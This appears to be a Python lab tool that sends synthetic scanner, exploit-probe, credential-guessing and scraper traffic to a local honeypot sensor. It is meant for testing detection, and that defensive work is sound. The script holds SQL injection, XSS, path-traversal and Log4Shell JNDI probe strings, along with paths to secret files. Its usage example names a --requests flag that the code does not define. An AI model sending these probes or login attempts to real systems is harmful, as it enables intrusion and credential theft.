#!/usr/bin/env python3
"""Synthetic traffic generator for the local lab.

Replays realistic client *profiles* against your own sensor so the classifier
and dashboard can be exercised without waiting for the internet to show up. It
is a test fixture, not an attack tool: every payload is inert, the target is
hard-defaulted to localhost, and pointing it at a host you do not operate is
both refused by default and pointless — the "exploits" are strings, not
exploits.

    python tools/simulate_traffic.py --requests 400
"""

from __future__ import annotations

import argparse
import random
import sys
import time
from urllib.parse import urlparse

try:
    import httpx
except ImportError:  # pragma: no cover
    sys.exit("httpx is required: pip install httpx")

LOCAL_HOSTS = {"127.0.0.1", "localhost", "::1", "0.0.0.0", "honeypot", "edge"}

CHROME_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)

BROWSER_HEADERS = {
    "User-Agent": CHROME_UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-User": "?1",
    "Sec-CH-UA": '"Chromium";v="126", "Not;A=Brand";v="24"',
    "Referer": "http://localhost:8080/",
}

SCANNER_PATHS = [
    "/.env", "/.git/config", "/wp-config.php", "/phpinfo.php", "/server-status",
    "/actuator/health", "/admin", "/phpmyadmin/index.php", "/backup.zip",
    "/.aws/credentials", "/config.json", "/telescope/requests", "/debug/vars",
]

BROWSER_PATHS = ["/", "/login", "/status", "/api/v1/products", "/robots.txt"]

INERT_PROBES = [
    "/api/v1/products?id=1%27%20UNION%20SELECT%20null--",
    "/search?q=<script>alert(1)</script>",
    "/download?file=../../../../etc/passwd",
    "/api/v1/products?id=${jndi:ldap://example.invalid/a}",
]

USERNAMES = ["admin", "root", "test", "gabriel", "support", "administrator",
             "user1", "info", "sa", "operator"]


def profile_human(client: httpx.Client, base: str) -> None:
    for path in random.sample(BROWSER_PATHS, k=random.randint(2, 4)):
        client.get(base + path, headers=BROWSER_HEADERS)
        time.sleep(random.uniform(0.2, 0.8))


def profile_verified_crawler(client: httpx.Client, base: str) -> None:
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Accept": "*/*",
        "Accept-Encoding": "gzip",
        "From": "googlebot(at)googlebot.com",
    }
    for path in ("/", "/robots.txt", "/api/v1/products"):
        client.get(base + path, headers=headers)


def profile_scanner(client: httpx.Client, base: str) -> None:
    headers = {"User-Agent": random.choice(["nikto/2.5.0", "gobuster/3.6", "curl/8.4.0"]),
               "Accept": "*/*"}
    for path in random.sample(SCANNER_PATHS, k=random.randint(8, len(SCANNER_PATHS))):
        client.get(base + path, headers=headers)


def profile_exploit_probe(client: httpx.Client, base: str) -> None:
    headers = {"User-Agent": "sqlmap/1.8#stable", "Accept": "*/*"}
    for path in INERT_PROBES:
        client.get(base + path, headers=headers)


def profile_credential_attack(client: httpx.Client, base: str) -> None:
    headers = {
        "User-Agent": "python-requests/2.32.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
    }
    for username in random.sample(USERNAMES, k=random.randint(6, len(USERNAMES))):
        client.post(
            base + "/login",
            headers=headers,
            data={"username": username, "password": f"synthetic-{random.randint(1000, 9999)}"},
        )


def profile_scraper(client: httpx.Client, base: str) -> None:
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Accept": "*/*",
    }
    for page in range(1, random.randint(12, 25)):
        client.get(f"{base}/api/v1/products?page={page}", headers=headers)


PROFILES = {
    "human": (profile_human, 3),
    "verified_crawler": (profile_verified_crawler, 1),
    "scanner": (profile_scanner, 3),
    "exploit_probe": (profile_exploit_probe, 2),
    "credential_attack": (profile_credential_attack, 2),
    "scraper": (profile_scraper, 2),
}


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://127.0.0.1:8080",
                        help="Base URL of your own lab (default: %(default)s)")
    parser.add_argument("--rounds", type=int, default=12, help="Number of client sessions")
    parser.add_argument("--allow-remote", action="store_true",
                        help="Required to target a non-loopback host you operate")
    args = parser.parse_args()

    host = urlparse(args.target).hostname or ""
    if host not in LOCAL_HOSTS and not args.allow_remote:
        parser.error(
            f"refusing to generate traffic against '{host}'. Re-run with --allow-remote "
            "only for a host you own and operate."
        )

    weighted = [name for name, (_, weight) in PROFILES.items() for _ in range(weight)]

    with httpx.Client(timeout=5.0, follow_redirects=False) as client:
        for i in range(args.rounds):
            name = random.choice(weighted)
            fn, _ = PROFILES[name]
            print(f"[{i + 1}/{args.rounds}] profile={name}")
            try:
                fn(client, args.target.rstrip("/"))
            except httpx.HTTPError as exc:
                print(f"  ! {exc}")
            time.sleep(random.uniform(0.1, 0.4))

    print("\nDone. Open the dashboard at <sensor>/_edl/dashboard")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
